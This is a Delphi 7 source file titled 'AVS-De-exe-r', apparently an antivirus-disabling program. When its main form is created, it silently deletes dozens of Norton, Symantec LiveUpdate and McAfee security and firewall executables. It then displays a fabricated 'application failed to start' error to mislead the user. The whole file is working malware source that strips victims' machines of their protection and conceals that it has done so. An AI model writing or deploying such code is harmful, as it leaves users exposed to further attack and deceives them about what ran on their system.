//main listing for AVS-De-exe-r as whatnotted in Object Pascal using Delphi 
7


unit Main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Menus;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Label1: TLabel;
    ListBox1: TListBox;
    MainMenu1: TMainMenu;
    File1: TMenuItem;
    Register1: TMenuItem;
    Search1: TMenuItem;
    View1: TMenuItem;
    ools1: TMenuItem;
    Window1: TMenuItem;
    Help1: TMenuItem;
    Memo1: TMemo;
    Button2: TButton;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
begin
  if fileExists ('C:\Program Files\Navnt\alertsvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\alertsvc.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\BackLog.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\BackLog.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\BootWarn.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\BootWarn.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\DefAlert.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\DefAlert.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\n32scanw.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\n32scanw.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\navapsvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\navapsvc.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\navapw32.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\navapw32.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\alertsvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\alertsvc.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\alertsvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\alertsvc.exe');
    end;
   if fileExists ('C:\Program Files\Navnt\alertsvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\alertsvc.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\alertsvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\alertsvc.exe');
    end;
   if fileExists ('C:\Program Files\Navnt\navapw32.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\navapw32.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\NavUStub.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\NavUStub.exe');
    end;
  if fileExists ('C:\Program Files\Navnt\navwnt.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\navwnt.exe');
    end;
   if fileExists ('C:\Program Files\Navnt\NPSCheck.EXE') then
    begin
      deleteFile ('C:\Program Files\Navnt\NPSCheck.EXE');
    end;
    if fileExists ('C:\Program Files\Navnt\npssvc.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\npssvc.exe');
    end;
     if fileExists ('C:\Program Files\Navnt\NSPlugin.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\NSPlugin.exe');
    end;
     if fileExists ('C:\Program Files\Navnt\NTaskMgr.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\NTaskMgr.exe');
    end;
     if fileExists ('C:\Program Files\Navnt\nvlaunch.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\nvlaunch.exe');
    end;
     if fileExists ('C:\Program Files\Navnt\POProxy.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\POProxy.exe');
    end;
     if fileExists ('C:\Program Files\Navnt\qconsole.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\qconsole.exe');
    end;
       if fileExists ('C:\Program Files\Navnt\ScnHndlr.exe') then
    begin
      deleteFile ('C:\Program Files\Navnt\ScnHndlr.exe');
    end;
      if fileExists ('C:\Program Files\Symantec\LiveUpdate\NDETECT.EXE') 
then
    begin
      deleteFile ('C:\Program Files\Symantec\LiveUpdate\NDETECT.EXE');
    end;
     if fileExists ('C:\Program Files\Symantec\LiveUpdate\AUPDATE.EXE') then
    begin
      deleteFile ('C:\Program Files\Symantec\LiveUpdate\AUPDATE.EXE');
    end;
     if fileExists ('C:\Program Files\Symantec\LiveUpdate\LUALL.EXE') then
    begin
      deleteFile ('C:\Program Files\Symantec\LiveUpdate\LUALL.EXE');
    end;
     if fileExists ('C:\Program Files\Symantec\LiveUpdate\LuComServer.EXE') 
then
    begin
      deleteFile ('C:\Program Files\Symantec\LiveUpdate\LuComServer.EXE');
    end;
    if fileExists ('C:\Program 
Files\Symantec\LiveUpdate\1.Settings.Default.LiveUpdate') then
    begin
      deleteFile ('C:\Program 
Files\Symantec\LiveUpdate\1.Settings.Default.LiveUpdate');
    end;
     if fileExists ('C:\Program Files\Symantec\LiveUpdate\LSETUP.EXE') then
    begin
      deleteFile ('C:\Program Files\Symantec\LiveUpdate\LSETUP.EXE');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Internet 
Security\gd32.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Internet 
Security\gd32.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Internet 
Security\gdlaunch.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Internet 
Security\gdlaunch.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Internet 
Security\gdcrypt.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Internet 
Security\gdcrypt.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Internet 
Security\GuardDog.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Internet 
Security\GuardDog.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Internet 
Security\IView.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Internet 
Security\IView.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Firewall\cpd.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Firewall\cpd.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared 
Components\VisualTrace\NeoTrace.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared 
Components\VisualTrace\NeoTrace.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared 
Components\Shredder\shred32.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared 
Components\Shredder\shred32.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared 
Components\QuickClean Lite\QClean.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared 
Components\QuickClean Lite\QClean.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared Components\Instant 
Updater\RuLaunch.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared Components\Instant 
Updater\RuLaunch.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared 
Components\Guardian\CMGrdian.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared 
Components\Guardian\CMGrdian.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared 
Components\Guardian\schedwiz.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared 
Components\Guardian\schedwiz.exe');
    end;
    if fileExists ('C:\Program Files\McAfee\McAfee Shared 
Components\Central\CLaunch.exe') then
    begin
      deleteFile ('C:\Program Files\McAfee\McAfee Shared 
Components\Central\CLaunch.exe');
    end;
  showmessage('Could not find dev\null\drivers.dll. Application failed to 
start.');

end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  Close;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  ListBox1.Visible := false;
  Memo1.Visible := true;
end;

end.
